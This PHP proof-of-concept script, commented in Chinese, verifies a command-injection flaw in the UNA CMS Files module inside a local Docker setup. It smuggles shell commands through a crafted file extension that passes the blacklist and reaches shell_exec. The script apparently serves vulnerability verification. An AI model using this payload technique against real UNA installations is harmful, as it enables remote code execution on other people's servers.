<?php
/**
 * UNA CMS BxFilesModule Command Injection — 本地 Docker 端到端真实链路验证
 *
 * 验证路径（全部走真实 UNA 代码，非模拟）：
 *   1. BxDolStorage::storeFileFromPath()  真实执行 getFileExt()=pathinfo 与 isValidExt() 黑名单校验
 *      （等价于攻击者通过 storage_uploader.php 上传恶意文件名）
 *   2. 恶意 ext 落库 bx_files_files.ext
 *   3. 构造 bx_files_main 条目 (data_processed=0) —— 等价于攻击者在 Files 模块创建文件条目
 *   4. 触发 BxDolService::call('bx_files','process_files_data') —— 与 sys_cron_jobs 中
 *      bx_files_process_data (BxFilesCronProcessData::processing) 完全一致
 *   5. serviceProcessFilesData() -> shell_exec("...--text \"<path>.<ext>\"")
 *
 * 注入 payload 约束（关键反证检查）：
 *   - $sFilePath = tmp/<remote_id>.<ext>，随后 @file_put_contents($sFilePath, ...) 先执行；
 *     若 ext 含 '/' 会使目标路径被解析为不存在的多级目录 -> 创建失败 -> file_exists 为 false
 *     -> continue，shell_exec 根本不会到达。因此可利用 payload 不得含 '/'。
 *   - 无 '/' payload 如 `pdf";id;#`：file_put_contents 成功创建空文件（含 ;"# 的文件名合法）
 *     -> shell_exec 执行 -> `"java"... --text "....pdf";id;#"` -> 引号闭合、; 分隔注入 id、# 注释尾部
 *
 * 证据：注入 `id` 的 stdout 被赋给 $sData -> updateFileData() 写回 bx_files_main.data 字段，
 *       读取该字段出现 "uid=" 即证明注入命令以 PHP 进程身份真实执行。
 */
error_reporting(E_ALL & ~E_DEPRECATED & ~E_NOTICE & ~E_WARNING);
ini_set('display_errors', 1);

$_SERVER['HTTP_HOST'] = 'localhost';
$_SERVER['HTTP_USER_AGENT'] = 'UNA';
$_SERVER['REQUEST_URI'] = '/';
$_ENV['UNA_SKIP_REDIRECT'] = '1';
$_ENV['UNA_SKIP_INSTALL_FOLDER_CHECK'] = '1';

$sRoot = '/var/www/html';
require($sRoot . '/inc/header.inc.php'); // header -> params.inc.php 已包含 profiles.inc.php

$oDb = BxDolDb::getInstance();

echo "═══════════════════════════════════════════════════════\n";
echo " UNA BxFilesModule CWE-78 — 本地端到端真实链路验证\n";
echo "═══════════════════════════════════════════════════════\n\n";

// ---------- Step 0: 环境前提 ----------
echo "[0] 环境前提检查\n";
echo "  BX_SYSTEM_JAVA = " . (defined('BX_SYSTEM_JAVA') ? constant('BX_SYSTEM_JAVA') : 'NOT DEFINED') . "\n";
$oStorage = BxDolStorage::getObjectInstance('bx_files_files');
if (!$oStorage) {
    echo "  [!!] bx_files_files storage 对象不可用 —— 无法验证\n";
    exit(1);
}
echo "  bx_files_files storage 对象 OK\n";

$iProfileId = (int)$oDb->getOne("SELECT `id` FROM `sys_profiles` WHERE `account_id` = 1 LIMIT 1");
if (!$iProfileId) $iProfileId = 1;
echo "  使用 profile_id = {$iProfileId}\n\n";

// ---------- Step 1: 真实存储路径上传恶意文件名 ----------
$ts = time();
// payload 不含 '/'（关键约束见文件头注释）；注入 id 的输出会回显到 bx_files_main.data
$sPayload = 'id;pwd;whoami';
$sEvilName = "evil.pdf\";{$sPayload};#";
$sTmpEvil = BX_DIRECTORY_PATH_TMP . 'upload_evil_' . $ts . '.dat';

echo "[1] 真实存储上传: storeFileFromPath(恶意文件名)\n";
echo "  上传文件名: {$sEvilName}\n";
$sExt = $oStorage->getFileExt($sEvilName);
echo "  getFileExt()=pathinfo 提取 ext = '{$sExt}'\n";
echo "  ext 含 shell 元字符: " . (preg_match('/["\'`;$|&(){}<>\\[\\]!#~\\\\*?\\n\\r]/', $sExt) ? "YES ✓" : "NO") . "\n";
echo "  ext 含 '/' : " . (strpos($sExt, '/') !== false ? "YES (将阻断)" : "NO ✓ (shell_exec 可达)") . "\n";

// 真实待上传内容 — 注意: HelperPath::getName() 返回的是『本地路径的 basename』，
// 因此本地临时文件必须命名为恶意文件名，pathinfo 提取的 ext 才会是注入载荷。
$sTmpEvil = BX_DIRECTORY_PATH_TMP . $sEvilName;
if (false === @file_put_contents($sTmpEvil, "UNA RCE e2e test content\n")) {
    echo "[!!] 无法在 tmp 创建恶意名临时文件\n";
    exit(1);
}

// real store — 内部执行 isValidExt(): ext_mode=deny-allow, isDeniedExt() -> in_array('pdf";id;pwd;whoami;#', sys_files_ext_dangerous 展开列表)
$iFileId = $oStorage->storeFileFromPath($sTmpEvil, false /*public*/, $iProfileId);
@unlink($sTmpEvil);
if (!$iFileId) {
    echo "  [!!] storeFileFromPath 失败: " . $oStorage->getErrorString() . "\n";
    exit(1);
}
echo "  storeFileFromPath 返回 file_id = {$iFileId}  =>  恶意 ext 通过黑名单并完成存储\n";

// 读取落库的 ext
$aFile = $oStorage->getFile($iFileId);
echo "  DB bx_files_files.ext = '{$aFile['ext']}'  (shell 元字符已落库)\n\n";

// ---------- Step 2: 创建 bx_files_main 条目 data_processed=0 ----------
echo "[2] 创建 bx_files_main 条目 (data_processed=0, file_id={$iFileId})\n";
$iNow = time();
$oDb->query("INSERT INTO `bx_files_main` 
    (`author`,`added`,`changed`,`file_id`,`title`,`cat`,`desc`,`data`,`data_processed`,`labels`,`location`,`allow_view_to`,`status`,`status_admin`,`type`)
    VALUES (:author, :now, :now, :file_id, 'e2e rce test', 0, '', '', 0, '', '', 3, 'active', 'active', 'file')", [
    'author' => $iProfileId,
    'now' => $iNow,
    'file_id' => $iFileId,
]);
$iContentId = (int)$oDb->lastId();
if (!$iContentId) {
    echo "  [!!] bx_files_main 插入失败: " . $oDb->getErrorMessage() . "\n";
    exit(1);
}
$iCnt = (int)$oDb->getOne("SELECT COUNT(*) FROM `bx_files_main` WHERE `data_processed` = 0");
echo "  新条目 content_id = {$iContentId}, 当前 data_processed=0 待处理数 = {$iCnt}\n\n";

// ---------- Step 3: 触发 cron 服务 (与 BxFilesCronProcessData::processing 相同) ----------
echo "[3] 触发 BxDolService::call('bx_files','process_files_data') ...\n";
$mRes = BxDolService::call('bx_files', 'process_files_data', array(3));
echo "  service 返回: " . var_export($mRes, true) . "\n\n";

// ---------- Step 4: 验证注入结果 ----------
echo "[4] 验证注入命令执行结果\n";
$aRow = $oDb->getRow("SELECT `id`,`data_processed`,`data` FROM `bx_files_main` WHERE `id` = {$iContentId}");
$iProc = (int)$aRow['data_processed'];
$sData = $aRow['data'];
echo "  条目 {$iContentId}: data_processed={$iProc}\n";
echo "  data 字段内容:\n";
echo "  ---------------------------------\n";
echo "  " . str_replace("\n", "\n  ", trim((string)$sData)) . "\n";
echo "  ---------------------------------\n";
if (preg_match('/^uid=\d+/m', (string)$sData))
    echo "\n  >>> 命令注入 → RCE 确认: 注入 'id' 的 stdout 已通过 shell_exec 回写到 data 字段 <<<\n";
else
    echo "\n  [!!] data 字段未发现 uid= 输出 —— 需进一步核查（如 java 是否占用 stdout、路径可达性等）\n";

// 清理：删除测试 storage 文件记录（保留内容条目便于人工复核）
// $oStorage->deleteFile($iFileId);
echo "\n[DONE]\n";
